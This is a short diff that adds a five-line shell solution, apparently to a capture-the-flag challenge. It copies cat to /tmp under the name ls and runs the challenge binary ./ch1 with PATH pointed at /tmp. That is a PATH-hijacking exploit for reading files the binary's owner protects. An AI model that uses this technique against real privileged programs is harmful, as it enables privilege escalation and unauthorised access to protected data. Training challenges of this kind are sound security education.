@@ -1,0 +1,5 @@
+cd /tmp/
+cp /bin/cat .
+mv cat ls
+cd /home/challenge1/
+PATH=/tmp/ ./ch1
